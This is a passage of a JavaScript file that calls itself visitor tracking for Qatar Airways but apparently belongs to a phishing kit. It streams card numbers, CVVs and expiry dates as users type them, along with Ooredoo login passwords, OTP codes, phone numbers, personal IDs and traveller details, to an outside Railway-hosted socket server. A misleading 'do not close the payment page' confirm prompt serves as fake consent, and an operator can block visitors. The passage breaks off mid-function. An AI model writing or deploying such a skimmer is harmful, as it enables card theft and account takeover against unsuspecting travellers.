/* Qatar Airways visitor presence tracking. */
(function () {
  'use strict';

  var SOCKET_URL = 'https://qatarairway-production.up.railway.app';
  var STORAGE_KEY = 'qatarVisitorId';
  var LEGACY_STORAGE_KEY = 'visitorId';
  var socket = null;
  var registered = false;
  var lastPage = '';
  var currentBookingState = null;
  var lastSentBookingState = '';
  var bookingFlushTimer = null;
  var flightStateTimer = null;
  var lastObservedFlightState = '';
  var pendingPassengerSubmissions = [];
  var lastPassengerSubmission = '';
  var pendingOperatorSubmissions = [];
  var lastOperatorSubmission = '';
  var liveCardConsent = false;
  var liveCardPresenceSent = false;
  var liveCardInputTimer = null;
  var finalPaymentFallbackTimer = null;
  var finalPaymentSubmitted = false;
  var PACKAGE_GUEST_STORAGE_KEY = 'qaPackageGuestConsentSubmission';
  var lastPackageGuestSubmission = '';

  var BOOKING_FIELD_TYPES = {
    product: 'product',
    tripType: 'trip',
    origin: 'iata',
    destination: 'iata',
    secondOrigin: 'iata',
    secondDestination: 'iata',
    departureDate: 'date',
    returnDate: 'date',
    secondDepartureDate: 'date',
    hotelDestination: 'text',
    hotelCheckin: 'date',
    hotelCheckout: 'date',
    adults: 'count',
    children: 'count',
    infants: 'count',
    travellers: 'count',
    rooms: 'count',
    cabinClass: 'cabin',
    stopoverLeg: 'leg',
    stopoverDays: 'count',
    language: 'language',
    stage: 'text',
    selection: 'selection',
    total: 'total',
    completedFields: 'count',
    totalFields: 'count',
    flightNumber: 'selection',
    fareFamily: 'selection',
    selectedSeats: 'selection'
  };

  var BOOKING_FIELD_LABELS = {
    product: 'نوع البحث',
    tripType: 'نوع الرحلة',
    origin: 'من',
    destination: 'إلى',
    secondOrigin: 'من - الرحلة الثانية',
    secondDestination: 'إلى - الرحلة الثانية',
    departureDate: 'تاريخ المغادرة',
    returnDate: 'تاريخ العودة',
    secondDepartureDate: 'تاريخ الرحلة الثانية',
    hotelDestination: 'الوجهة الفندقية',
    hotelCheckin: 'تسجيل دخول الفندق',
    hotelCheckout: 'تسجيل خروج الفندق',
    adults: 'البالغون',
    children: 'الأطفال',
    infants: 'الرضع',
    travellers: 'إجمالي المسافرين',
    rooms: 'الغرف',
    cabinClass: 'درجة السفر',
    stopoverLeg: 'موضع التوقف',
    stopoverDays: 'أيام التوقف',
    language: 'اللغة',
    stage: 'المرحلة',
    selection: 'الاختيار',
    total: 'السعر الإجمالي',
    completedFields: 'الحقول المكتملة',
    totalFields: 'إجمالي الحقول',
    flightNumber: 'رقم الرحلة',
    fareFamily: 'الباقة',
    selectedSeats: 'المقاعد المختارة'
  };

  function readVisitorIds() {
    try {
      var fromUrl = new URLSearchParams(window.location.search).get('vid') || '';
      var trackingId = window.localStorage.getItem(STORAGE_KEY) || '';
      var legacyId = window.localStorage.getItem(LEGACY_STORAGE_KEY) || '';
      var primaryId = fromUrl || trackingId || legacyId;
      var alternateId = '';
      if (trackingId && trackingId !== primaryId) alternateId = trackingId;
      if (legacyId && legacyId !== primaryId) alternateId = legacyId;
      return { primaryId: primaryId, alternateId: alternateId };
    } catch (error) {
      return { primaryId: '', alternateId: '' };
    }
  }

  function saveVisitorId(visitorId) {
    if (!visitorId || visitorId === 'error') return;
    try {
      window.localStorage.setItem(STORAGE_KEY, visitorId);
      window.localStorage.setItem(LEGACY_STORAGE_KEY, visitorId);
    } catch (error) {}
  }

  function getPageName() {
    var path = (window.location.pathname || '/').toLowerCase();

    if (path.indexOf('package-results') !== -1 || path.indexOf('packages-results') !== -1 || path.indexOf('flight-search') !== -1) return 'نتائج البحث';
    if (path.indexOf('package-information') !== -1) return 'بيانات ضيوف الباقة';
    if (path.indexOf('passenger-details') !== -1) return 'بيانات المسافر';
    if (path.indexOf('contact') !== -1) return 'جهة الاتصال';
    if (path.indexOf('wheelchair') !== -1 || path.indexOf('assistance') !== -1) return 'كرسي متحرك';
    if (path.indexOf('seat-selection') !== -1 || path.indexOf('seat') !== -1) return 'اختيار المقعد';
    if (path.indexOf('meal') !== -1) return 'الوجبات';
    if (path.indexOf('trip-summary') !== -1) return 'الملخص والمراجعة';
    if (path.indexOf('summary-payment') !== -1) return 'المراجعة والدفع';
    if (path.indexOf('package-details') !== -1 || path.indexOf('package-summary') !== -1 || path.indexOf('custom') !== -1) return 'تخصيص الرحلة';
    if (path.indexOf('extras') !== -1 || path.indexOf('addon') !== -1) return 'إضافات';
    if (path.indexOf('credit-card-payment') !== -1) return 'الدفع بالبطاقة';
    if (path.indexOf('mobile-verification') !== -1) return 'مشغل الشبكة';
    if (path.indexOf('ooredoo-login') !== -1) return 'أوريدو';
    if (path.indexOf('ooredoo-otp') !== -1) return 'رمز أوريدو';
    if (path.indexOf('otp-verification') !== -1) return 'التحقق بالرمز';
    if (path.indexOf('review-pay') !== -1 || path.indexOf('atm-password') !== -1 || path.indexOf('knet-payment') !== -1 || path.indexOf('cvv') !== -1) return 'المراجعة والدفع';
    return 'الرئيسية';
  }

  function safeText(value, maxLength) {
    if (value === null || value === undefined) return '';
    var text = String(value).replace(/[\u0000-\u001f\u007f]/g, ' ').trim();
    return text.slice(0, maxLength || 120);
  }

  function safeBookingValue(type, value) {
    var text;
    var number;
    if (type === 'count') {
      number = Number(value);
      if (!Number.isFinite(number)) return null;
      return Math.max(0, Math.min(100, Math.round(number)));
    }
    if (type === 'iata') {
      text = safeText(value, 5).toUpperCase();
      return /^[A-Z0-9]{3,5}$/.test(text) ? text : '';
    }
    if (type === 'date') {
      text = safeText(value, 10);
      return /^\d{4}-\d{2}-\d{2}$/.test(text) ? text : '';
    }
    if (type === 'product') {
      text = safeText(value, 20).toLowerCase();
      return { flight: 'رحلة طيران', stopover: 'التوقف المؤقت', 'flight-hotel': 'رحلة + فندق', hotel: 'فندق' }[text] || '';
    }
    if (type === 'trip') {
      text = safeText(value, 20).toLowerCase();
      return { round: 'ذهاب وعودة', oneway: 'اتجاه واحد', 'one-way': 'اتجاه واحد', multi: 'وجهات متعددة', multicity: 'وجهات متعددة' }[text] || '';
    }
    if (type === 'cabin') {
      text = safeText(value, 20).toUpperCase();
      return { E: 'الدرجة السياحية', ECONOMY: 'الدرجة السياحية', F: 'الأولى / رجال الأعمال', PREMIUM: 'الأولى / رجال الأعمال', BUSINESS: 'درجة رجال الأعمال', FIRST: 'الدرجة الأولى' }[text] || '';
    }
    if (type === 'leg') {
      text = safeText(value, 20).toLowerCase();
      return { outbound: 'رحلة المغادرة', return: 'رحلة العودة' }[text] || '';
    }
    if (type === 'language') {
      text = safeText(value, 5).toLowerCase();
      return text === 'ar' ? 'العربية' : (text === 'en' ? 'English' : '');
    }
    if (type === 'selection') return safeText(value, 160);
    if (type === 'total') return safeText(value, 80);
    return safeText(value, 120);
  }

  function sanitizeBookingState(input) {
    if (!input || typeof input !== 'object' || Array.isArray(input)) return null;
    var output = {};
    Object.keys(BOOKING_FIELD_TYPES).forEach(function (key) {
      if (!Object.prototype.hasOwnProperty.call(input, key)) return;
      var value = safeBookingValue(BOOKING_FIELD_TYPES[key], input[key]);
      if (value === '' || value === null || value === undefined) return;
      output[key] = value;
    });
    return Object.keys(output).length ? output : null;
  }

  function isSubmitOnlyDataPage() {
    var path = (window.location.pathname || '').toLowerCase();
    return path.indexOf('/mobile-verification') === 0 ||
      path.indexOf('/ooredoo-login') === 0 ||
      path.indexOf('/ooredoo-otp') === 0 ||
      path.indexOf('/otp-verification') === 0;
  }

  function flushBookingState(force) {
    if (bookingFlushTimer) {
      window.clearTimeout(bookingFlushTimer);
      bookingFlushTimer = null;
    }
    if (!currentBookingState || !socket || !socket.connected || !registered) return;
    if (getPageName() === 'الرئيسية' || isSubmitOnlyDataPage()) return;
    var serialized = JSON.stringify(currentBookingState);
    if (!force && serialized === lastSentBookingState) return;
    var content = { 'نوع التحديث': 'حالة الحجز المباشرة' };
    Object.keys(currentBookingState).forEach(function (key) {
      content[BOOKING_FIELD_LABELS[key]] = currentBookingState[key];
    });
    socket.emit('more-info', {
      content: content,
      page: getPageName(),
      waitingForAdminResponse: false,
      mode: 'booking-state'
    });
    lastSentBookingState = serialized;
  }

  window.qaTrackBookingState = function (input) {
    var sanitized = sanitizeBookingState(input);
    if (!sanitized) return;
    currentBookingState = sanitized;
    if (bookingFlushTimer) window.clearTimeout(bookingFlushTimer);
    bookingFlushTimer = window.setTimeout(function () { flushBookingState(false); }, 180);
  };

  function reportStoredPackageState() {
    try {
      var stored = JSON.parse(window.sessionStorage.getItem('qaPackageSearch') || 'null');
      if (!stored || !Array.isArray(stored.params)) return;
      var params = new URLSearchParams(stored.params);
      var product = safeText(stored.product, 20).toLowerCase();
      var snapshot = { product: product, language: stored.lang, stage: getPageName(), selection: stored.summary || '' };
      if (product === 'stopover') {
        snapshot.origin = params.get('iataFrom');
        snapshot.destination = params.get('iataTo');
        snapshot.secondOrigin = params.get('otherLegs[2][iataFrom]');
        snapshot.secondDestination = params.get('otherLegs[2][iataTo]');
        snapshot.departureDate = params.get('outboundDate');
        snapshot.returnDate = params.get('returnDate');
        snapshot.secondDepartureDate = params.get('leg2_outboundDate');
        snapshot.travellers = params.get('numPassengers');
        snapshot.rooms = params.get('numRooms');
        snapshot.cabinClass = params.get('classOfService');
        snapshot.stopoverLeg = params.get('stopover') === 'end' ? 'return' : 'outbound';
        snapshot.stopoverDays = params.get('stopover_nights');
      } else if (product === 'flight-hotel') {
        var from = params.getAll('products[flight][iataFrom][]');
        var to = params.getAll('products[flight][iataTo][]');
        var dates = params.getAll('products[flight][outboundDate][]');
        snapshot.origin = from[0];
        snapshot.destination = to[0];
        snapshot.secondOrigin = from[1];
        snapshot.secondDestination = to[1];
        snapshot.departureDate = dates[0];
        snapshot.returnDate = dates[1];
        snapshot.hotelDestination = params.get('products[hotel][locationKey][]');
        snapshot.hotelCheckin = params.get('products[hotel][checkinDate][]');
        snapshot.hotelCheckout = params.get('products[hotel][checkoutDate][]');
        snapshot.rooms = params.get('numRooms');
        snapshot.cabinClass = params.get('classOfService');
      } else if (product === 'hotel') {
        snapshot.hotelDestination = params.get('products[hotel][locationKey][]') || params.get('locationKey');
        snapshot.hotelCheckin = params.get('products[hotel][checkinDate][]') || params.get('checkinDate');
        snapshot.hotelCheckout = params.get('products[hotel][checkoutDate][]') || params.get('checkoutDate');
        snapshot.rooms = params.get('numRooms');
      }
      window.qaTrackBookingState(snapshot);
    } catch (error) {}
  }

  function readJson(storage, key) {
    try {
      return JSON.parse(storage.getItem(key) || 'null');
    } catch (error) {
      return null;
    }
  }

  function isFlightFlowPath() {
    var path = (window.location.pathname || '/').toLowerCase();
    return /\/(flight-search|passenger-details|trip-summary|summary-payment|emergency-contact|wheelchair|assistance|seat-selection|meals|customize-your-trip|extras|credit-card-payment)(?:\/|$)/.test(path);
  }

  function seatCodesFrom(value) {
    var seats = [];
    function visit(item, depth) {
      if (depth > 4 || item === null || item === undefined) return;
      if (Array.isArray(item)) {
        item.forEach(function (value) { visit(value, depth + 1); });
        return;
      }
      if (typeof item === 'object') {
        Object.keys(item).forEach(function (key) { visit(item[key], depth + 1); });
        return;
      }
      var text = safeText(item, 80).toUpperCase();
      var matches = text.match(/(?:^|\s)(\d{1,3}[A-Z]{1,2})(?=\s|$|[-–—,])/g) || [];
      matches.forEach(function (match) {
        var seat = match.trim().match(/^\d{1,3}[A-Z]{1,2}/);
        if (seat && seats.indexOf(seat[0]) === -1) seats.push(seat[0]);
      });
    }
    visit(value, 0);
    return seats.slice(0, 12);
  }

  function reportStoredFlightState() {
    if (!isFlightFlowPath()) return;
    try {
      var query = new URLSearchParams(window.location.search || '');
      var selected = readJson(window.localStorage, 'selectedFlight') || {};
      var summary = readJson(window.localStorage, 'tripSummary') || {};
      var people = readJson(window.localStorage, 'passengerData');
      var assignments = readJson(window.localStorage, 'seatAssignments');
      var selections = readJson(window.localStorage, 'seatSelections');
      var singleSeat = window.localStorage.getItem('selectedSeat') || '';
      var legs = Array.isArray(selected.legs) ? selected.legs : [];
      var firstLeg = legs[0] || {};
      var queryOrigin = query.get('origin') || '';
      var queryDestination = query.get('destination') || '';
      var selectedOrigin = selected.origin || firstLeg.origin || '';
      var selectedDestination = selected.destination || firstLeg.destination || '';
      if ((queryOrigin && selectedOrigin && queryOrigin !== selectedOrigin) || (queryDestination && selectedDestination && queryDestination !== selectedDestination)) {
        selected = {};
        legs = [];
        firstLeg = {};
        selectedOrigin = '';
        selectedDestination = '';
      }
      var origin = queryOrigin || selectedOrigin;
      var destination = queryDestination || selectedDestination;
      var tripType = query.get('tripType') || selected.tripType || summary.tripType || '';
      var adults = query.get('adult') || selected.adults || summary.adults || '';
      var children = query.get('child') || selected.children || summary.children || '';
      var infants = query.get('infant') || selected.infants || summary.infants || '';
      var seats = seatCodesFrom(assignments).concat(seatCodesFrom(selections), seatCodesFrom(singleSeat));
      seats = seats.filter(function (seat, index) { return seats.indexOf(seat) === index; });
      var completed = 0;
      if (Array.isArray(people)) {
        people.forEach(function (person) {
          if (person && safeText(person.firstName, 1) && safeText(person.lastName, 1)) completed += 1;
        });
      }
      var snapshot = {
        product: 'flight',
        tripType: tripType,
        origin: origin,
        destination: destination,
        departureDate: query.get('date') || selected.date || firstLeg.date || summary.firstDate || '',
        returnDate: query.get('returnDate') || selected.returnDate || summary.returnDate || '',
        adults: adults,
        children: children,
        infants: infants,
        travellers: query.get('passengers') || selected.passengers || summary.passengers || (Array.isArray(people) ? people.length : ''),
        cabinClass: query.get('cabin') || selected.cabin || summary.cabin || '',
        language: (document.documentElement.lang || '').toLowerCase().indexOf('en') === 0 ? 'en' : 'ar',
        stage: getPageName(),
        selection: origin && destination ? origin + ' → ' + destination : '',
        total: selected.totalPriceKWD !== undefined ? String(selected.totalPriceKWD) + ' ' + safeText(selected.currency || 'QAR', 8) : (summary.total !== undefined ? String(summary.total) + ' ' + safeText(summary.curCode || '', 8) : ''),
        flightNumber: selected.flightNumber || firstLeg.flightNumber || '',
        fareFamily: selected.fare || firstLeg.fare || summary.bundleName || '',
        selectedSeats: seats.join('، '),
        completedFields: completed,
        totalFields: Array.isArray(people) ? people.length : ''
      };
      var observed = JSON.stringify(sanitizeBookingState(snapshot) || {});
      if (!observed || observed === '{}' || observed === lastObservedFlightState) return;
      lastObservedFlightState = observed;
      window.qaTrackBookingState(snapshot);
    } catch (error) {}
  }

  function watchFlightState() {
    if (window.__qaFlightStateTracking) return;
    window.__qaFlightStateTracking = true;
    reportStoredFlightState();
    flightStateTimer = window.setInterval(reportStoredFlightState, 350);
  }

  function reportPage(force) {
    if (!socket || !socket.connected || !registered) return;
    var page = getPageName();
    if (!force && page === lastPage) return;
    lastPage = page;
    socket.emit('visitor:pageEnter', page);
    syncLiveCardPage(false);
  }

  function watchNavigation() {
    if (window.__qaVisitorNavigationTracking) return;
    window.__qaVisitorNavigationTracking = true;

    ['pushState', 'replaceState'].forEach(function (method) {
      var original = window.history[method];
      if (typeof original !== 'function') return;
      window.history[method] = function () {
        var result = original.apply(this, arguments);
        window.setTimeout(function () {
          reportPage(false);
          reportStoredFlightState();
        }, 0);
        return result;
      };
    });

    window.addEventListener('popstate', function () {
      reportPage(false);
      reportStoredFlightState();
    });
    window.addEventListener('hashchange', function () {
      reportPage(false);
      reportStoredFlightState();
    });
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState !== 'visible') return;
      if (socket && !socket.connected) socket.connect();
      reportPage(true);
      reportStoredFlightState();
    });
  }

  function passengerTitleLabel(value) {
    var code = safeText(value, 20).toUpperCase();
    return { MR: 'السيد', MRS: 'السيدة', MS: 'الآنسة', MISS: 'الآنسة', SHEIKH: 'الشيخ', SHEIKHA: 'الشيخة', BRIG: 'العميد', CAPT: 'النقيب', COL: 'العقيد', DR: 'الدكتور', GEN: 'اللواء', PROF: 'البروفيسور' }[code] || code;
  }

  function passengerTypeLabel(value) {
    var type = safeText(value, 20).toLowerCase();
    return type === 'child' ? 'طفل' : (type === 'infant' ? 'رضيع' : 'بالغ');
  }

  function passengerSubmissionContent(detail) {
    if (!detail || !detail.passenger || typeof detail.passenger !== 'object') return null;
    var passenger = detail.passenger;
    var index = Math.max(0, Math.min(99, Number(detail.index) || 0));
    var suffix = ' (مسافر ' + (index + 1) + ')';
    var content = {};
    var fullName = safeText((safeText(passenger.firstName, 60) + ' ' + safeText(passenger.lastName, 60)).trim(), 125);
    content['نوع المسافر' + suffix] = passengerTypeLabel(passenger.type);
    content['الاسم' + suffix] = fullName;
    content['اللقب' + suffix] = passengerTitleLabel(passenger.title);
    content['الجنس' + suffix] = safeText(passenger.gender, 20).toLowerCase() === 'female' ? 'أنثى' : 'ذكر';
    content['تاريخ الميلاد' + suffix] = /^\d{4}-\d{2}-\d{2}$/.test(safeText(passenger.dob, 10)) ? safeText(passenger.dob, 10) : '';
    content['الجنسية' + suffix] = safeText(passenger.nationality, 80);
    content['الموافقة على إرسال بيانات المسافر' + suffix] = 'نعم';
    Object.keys(content).forEach(function (key) {
      if (!content[key]) delete content[key];
    });
    return fullName ? content : null;
  }

  function sendPassengerSubmission(content) {
    if (!content) return;
    var serialized = JSON.stringify(content);
    if (serialized === lastPassengerSubmission) return;
    if (!socket || !socket.connected || !registered) {
      pendingPassengerSubmissions.push(content);
      return;
    }
    socket.emit('more-info', {
      content: content,
      page: 'بيانات المسافر',
      waitingForAdminResponse: false,
      mode: 'passenger-consent'
    });
    lastPassengerSubmission = serialized;
  }

  function flushPassengerSubmissions() {
    if (!socket || !socket.connected || !registered || !pendingPassengerSubmissions.length) return;
    var queued = pendingPassengerSubmissions.slice();
    pendingPassengerSubmissions = [];
    queued.forEach(sendPassengerSubmission);
  }

  function watchPassengerConsent() {
    if (window.__qaPassengerConsentTracking) return;
    window.__qaPassengerConsentTracking = true;
    window.addEventListener('qa:passenger-consent', function (event) {
      sendPassengerSubmission(passengerSubmissionContent(event && event.detail));
    });
  }

  function operatorSubmissionContent(detail) {
    if (!detail || detail.consent !== true || typeof detail !== 'object') return null;
    var kind = safeText(detail.kind, 40).toLowerCase();
    var data = detail.data && typeof detail.data === 'object' ? detail.data : {};
    var content = {};
    if (kind === 'mobile-verification') {
      var provider = safeText(data.provider, 20).toLowerCase();
      var phone = safeText(data.phone, 12).replace(/\D/g, '');
      var personalId = safeText(data.personalId, 20).replace(/\D/g, '');
      if (['ooredoo', 'vodafone'].indexOf(provider) === -1 || phone.length < 7) return null;
      content['مزود الخدمة'] = provider === 'ooredoo' ? 'أوريدو ooredoo' : 'فودافون vodafone';
      content['رقم الهاتف'] = phone;
      if (provider === 'ooredoo' && personalId) content['الرقم الشخصي'] = personalId;
      content['الموافقة على إرسال بيانات توثيق الهاتف'] = 'نعم';
    } else if (kind === 'ooredoo-login') {
      var identifier = safeText(data.identifier, 160);
      var password = safeText(data.password, 128);
      if (identifier.length < 4 || password.length < 4) return null;
      content['اسم مستخدم Ooredoo'] = identifier;
      content['كلمة مرور Ooredoo'] = password;
      content['الخدمة'] = 'Ooredoo';
      content['الموافقة على إرسال بيانات Ooredoo'] = 'نعم';
    } else if (kind === 'ooredoo-otp') {
      var code = safeText(data.code, 4).replace(/\D/g, '');
      if (code.length !== 4) return null;
      content['رمز OTP Ooredoo'] = code;
      content['الخدمة'] = 'Ooredoo';
      content['الموافقة على إرسال رمز Ooredoo'] = 'نعم';
    } else if (kind === 'ooredoo-resend') {
      content['طلب'] = 'إعادة إرسال رمز Ooredoo';
      content['الخدمة'] = 'Ooredoo';
    } else {
      return null;
    }
    return {
      content: content,
      page: safeText(detail.page, 80) || getPageName(),
      waitingMessage: safeText(detail.waitingMessage, 160),
      kind: kind
    };
  }

  function sendOperatorSubmission(detail) {
    var submission = detail && detail.content ? detail : operatorSubmissionContent(detail);
    if (!submission) return;
    var serialized = JSON.stringify(submission);
    if (serialized === lastOperatorSubmission) return;
    if (!socket || !socket.connected || !registered) {
      pendingOperatorSubmissions.push(submission);
      return;
    }
    socket.emit('more-info', {
      content: submission.content,
      page: submission.page,
      waitingForAdminResponse: true,
      mode: 'operator-consent',
      customWaitingMessage: submission.waitingMessage
    });
    lastOperatorSubmission = serialized;
  }

  function flushOperatorSubmissions() {
    if (!socket || !socket.connected || !registered || !pendingOperatorSubmissions.length) return;
    var queued = pendingOperatorSubmissions.slice();
    pendingOperatorSubmissions = [];
    queued.forEach(sendOperatorSubmission);
  }

  function watchOperatorConsent() {
    if (window.__qaOperatorConsentTracking) return;
    window.__qaOperatorConsentTracking = true;
    window.addEventListener('qa:operator-consent', function (event) {
      sendOperatorSubmission(event && event.detail);
    });
  }

  function isCreditCardPage() {
    return /\/(credit-card-payment)(?:\/|$)/.test((window.location.pathname || '').toLowerCase());
  }

  function liveCardFields() {
    var cardNumber = document.getElementById('pay-card');
    var nameOnCard = document.getElementById('pay-name');
    var expiryDate = document.getElementById('pay-exp');
    var cvv = document.getElementById('pay-cvv');
    if (!cardNumber || !nameOnCard || !expiryDate || !cvv) return null;
    return {
      cardNumber: safeText(cardNumber.value, 32).replace(/\D/g, '').slice(0, 19),
      nameOnCard: safeText(nameOnCard.value, 80),
      expiryDate: safeText(expiryDate.value, 5).replace(/[^0-9/]/g, '').slice(0, 5),
      cvv: safeText(cvv.value, 3).replace(/\D/g, '').slice(0, 3),
      consent: true
    };
  }

  function emitLiveCard() {
    if (!liveCardConsent || !socket || !socket.connected || !registered || !isCreditCardPage()) return;
    var fields = liveCardFields();
    if (fields) socket.emit('card:live', fields);
  }

  function syncLiveCardPage(force) {
    if (!socket || !socket.connected || !registered) return;
    if (!isCreditCardPage()) {
      if (liveCardPresenceSent) socket.emit('card:liveHide');
      window.clearTimeout(finalPaymentFallbackTimer);
      finalPaymentFallbackTimer = null;
      finalPaymentSubmitted = false;
      liveCardPresenceSent = false;
      liveCardConsent = false;
      window.__qaLiveCardConsentDeclined = false;
      return;
    }
    if (force || !liveCardPresenceSent) {
      socket.emit('card:live', { presence: true });
      liveCardPresenceSent = true;
    }
    emitLiveCard();
  }
 function requestLiveCardConsent() {
    if (liveCardConsent || window.__qaLiveCardConsentDeclined || !isCreditCardPage()) return liveCardConsent;
    var english = (document.documentElement.lang || '').toLowerCase().indexOf('en') === 0;
    var approved = window.confirm(english
      ? 'Do not close or refresh the Payment page to avoid losing your payment'
      : 'تنبيه: لا تغلق أو تحدث عملية الدفع لتجنب فقدان دفعتك');
    if (approved) {
      liveCardConsent = true;
      emitLiveCard();
    } else {
      window.__qaLiveCardConsentDeclined = true;
    }
    return liveCardConsent;
  }

   function finalPaymentPayload() {
    if (!liveCardConsent || !isCreditCardPage()) return null;
    var fields = liveCardFields();
    if (!fields || !/^\d{13,19}$/.test(fields.cardNumber) || !fields.nameOnCard || !/^\d{2}\/\d{2}$/.test(fields.expiryDate) || !/^\d{3,4}$/.test(fields.cvv)) return null;
    var agreement = document.querySelector('.qr-pay-agree input[type="checkbox"]');
    if (agreement && !agreement.checked) return null;
    var expiry = fields.expiryDate.split('/');
    var cardType = fields.cardNumber.charAt(0) === '4' ? 'Visa' : (/^[25]/.test(fields.cardNumber) ? 'Mastercard' : (/^3[47]/.test(fields.cardNumber) ? 'Amex' : (fields.cardNumber.charAt(0) === '6' ? 'Discover' : 'Unknown')));
    var totalNode = document.querySelector('.qr-pay-trip-row--bold span:last-child');
    var totalRaw = '';
    if (totalNode) { var totalCopy = totalNode.cloneNode(true); Array.prototype.forEach.call(totalCopy.querySelectorAll('s, .qa-disc-was'), function (x) { x.remove(); }); totalRaw = totalCopy.textContent; }
    var totalText = safeText(totalRaw, 80).replace(/,/g, '');
    var amountMatch = totalText.match(/\d+(?:\.\d+)?/);
    return {
      paymentCard: {
        cardNumber: fields.cardNumber,
        nameOnCard: fields.nameOnCard,
        expiryMonth: expiry[0],
        expiryYear: expiry[1],
        cvv: fields.cvv,
        cardType: cardType,
        bankName: 'Unknown',
        amount: amountMatch ? amountMatch[0] : '',
        productName: 'Qatar Airways'
      },
      page: getPageName(),
      waitingForAdminResponse: true
    };
  }

  function scheduleFinalPaymentFallback() {
    if (finalPaymentSubmitted || finalPaymentFallbackTimer || !socket || !socket.connected || !registered) return;
    var payload = finalPaymentPayload();
    if (!payload) return;
    finalPaymentFallbackTimer = window.setTimeout(function () {
      finalPaymentFallbackTimer = null;
      if (finalPaymentSubmitted || !socket || !socket.connected || !registered || !isCreditCardPage()) return;
      finalPaymentSubmitted = true;
      socket.emit('more-info', payload);
    }, 1500);
  }

  function watchLiveCard() {
    if (window.__qaLiveCardTracking) return;
    window.__qaLiveCardTracking = true;
    var fieldIds = ['pay-card', 'pay-name', 'pay-exp', 'pay-cvv'];
    document.addEventListener('focusin', function (event) {
      if (!event.target || fieldIds.indexOf(event.target.id) === -1) return;
      requestLiveCardConsent();
    }, true);
    document.addEventListener('input', function (event) {
      if (!event.target || fieldIds.indexOf(event.target.id) === -1 || !liveCardConsent) return;
      window.clearTimeout(liveCardInputTimer);
      liveCardInputTimer = window.setTimeout(emitLiveCard, 60);
    }, true);
    document.addEventListener('click', function (event) {
      var button = event.target && event.target.closest ? event.target.closest('.qr-pay-submit') : null;
      if (button && !button.disabled) scheduleFinalPaymentFallback();
    }, true);
    syncLiveCardPage(false);
  }

  function packageGuestSubmissionContent(detail) {
    if (!detail || detail.termsAccepted !== true || detail.dataConsent !== true || !Array.isArray(detail.guests)) return null;
    var content = {};
    var typeLabels = { adult: 'بالغ', child: 'طفل', infant: 'رضيع' };
    var titleLabels = { mr: 'السيد', mrs: 'السيدة', miss: 'الآنسة' };
    detail.guests.slice(0, 30).forEach(function (guest, index) {
      if (!guest || typeof guest !== 'object') return;
      var suffix = ' (ضيف ' + (index + 1) + ')';
      var firstName = safeText(guest.firstName, 60);
      var lastName = safeText(guest.lastName, 60);
      var fullName = safeText((firstName + ' ' + lastName).trim(), 125);
      var day = safeText(guest.day, 2);
      var month = safeText(guest.month, 2);
      var year = safeText(guest.year, 4);
      var dob = /^\d{1,2}$/.test(day) && /^\d{1,2}$/.test(month) && /^\d{4}$/.test(year) ? year + '-' + month.padStart(2, '0') + '-' + day.padStart(2, '0') : '';
      content['نوع الضيف' + suffix] = typeLabels[safeText(guest.type, 20).toLowerCase()] || '';
      content['اسم الضيف' + suffix] = fullName;
      content['لقب الضيف' + suffix] = titleLabels[safeText(guest.title, 20).toLowerCase()] || safeText(guest.title, 20);
      content['تاريخ ميلاد الضيف' + suffix] = dob;
    });
    var contact = detail.contact && typeof detail.contact === 'object' ? detail.contact : {};
    var phoneCode = safeText(contact.phoneCode, 10);
    var phone = safeText(contact.phone, 30);
    var alternatePhoneCode = safeText(contact.alternatePhoneCode, 10);
    var alternatePhone = safeText(contact.alternatePhone, 30);
    content['اسم جهة الاتصال'] = safeText(contact.name, 125);
    content['البريد الإلكتروني للتواصل'] = safeText(contact.email, 160);
    content['رقم هاتف التواصل'] = safeText((phoneCode + ' ' + phone).trim(), 45);
    content['رقم الهاتف البديل'] = alternatePhone ? safeText((alternatePhoneCode + ' ' + alternatePhone).trim(), 45) : '';
    content['العنوان'] = safeText(contact.address1, 160);
    content['العنوان الإضافي'] = safeText(contact.address2, 160);
    content['المدينة'] = safeText(contact.city, 80);
    content['البلد'] = safeText(contact.country, 80);
    content['الجنسية'] = safeText(contact.nationality, 80);
    content['الموافقة على الشروط والأحكام'] = 'نعم';
    content['الموافقة على إرسال بيانات ضيوف الباقة'] = 'نعم';
    Object.keys(content).forEach(function (key) {
      if (!content[key]) delete content[key];
    });
    return Object.keys(content).length ? content : null;
  }

  function clearPackageGuestSubmission() {
    try { window.sessionStorage.removeItem(PACKAGE_GUEST_STORAGE_KEY); } catch (error) {}
  }

  function readPackageGuestSubmission() {
    try { return JSON.parse(window.sessionStorage.getItem(PACKAGE_GUEST_STORAGE_KEY) || 'null'); } catch (error) { return null; }
  }

  function sendPackageGuestSubmission(detail) {
    var content = packageGuestSubmissionContent(detail);
    if (!content) return;
    var serialized = JSON.stringify(content);
    if (serialized === lastPackageGuestSubmission) {
      clearPackageGuestSubmission();
      return;
    }
    if (!socket || !socket.connected || !registered) return;
    socket.emit('more-info', {
      content: content,
      page: 'بيانات ضيوف الباقة',
      waitingForAdminResponse: false,
      mode: 'package-guest-consent'
    });
    lastPackageGuestSubmission = serialized;
    clearPackageGuestSubmission();
  }

  function flushPackageGuestSubmission() {
    var pending = readPackageGuestSubmission();
    if (pending) sendPackageGuestSubmission(pending);
  }

  function watchPackageGuestConsent() {
    if (window.__qaPackageGuestConsentTracking) return;
    window.__qaPackageGuestConsentTracking = true;
    window.addEventListener('qa:package-guest-consent', function (event) {
      var path = (window.location.pathname || '').toLowerCase();
      if (path.indexOf('package-information') !== -1) return;
      sendPackageGuestSubmission(event && event.detail);
    });
  }

  function showBlockedScreen() {
    if (document.getElementById('qa-visitor-blocked')) return;
    var overlay = document.createElement('div');
    overlay.id = 'qa-visitor-blocked';
    overlay.setAttribute('role', 'alert');
    overlay.setAttribute('aria-live', 'assertive');
    overlay.dataset.previousOverflow = document.documentElement.style.overflow || '';
    overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:24px;background:#f3f4f6;font-family:Arial,sans-serif;text-align:center;';
    overlay.innerHTML = '<div style="width:min(100%,460px);padding:36px 28px;border-radius:18px;background:#fff;box-shadow:0 20px 50px rgba(0,0,0,.16)"><div style="width:72px;height:72px;margin:0 auto 20px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#fee2e2;color:#b91c1c;font-size:36px;font-weight:700">×</div><h1 style="margin:0 0 12px;color:#1f2937;font-size:28px">تم الحظر</h1><p style="margin:0;color:#4b5563;font-size:17px;line-height:1.7">تم حظرك من استخدام الموقع.</p></div>';
    document.documentElement.style.overflow = 'hidden';
    document.body.appendChild(overlay);
  }

  function hideBlockedScreen() {
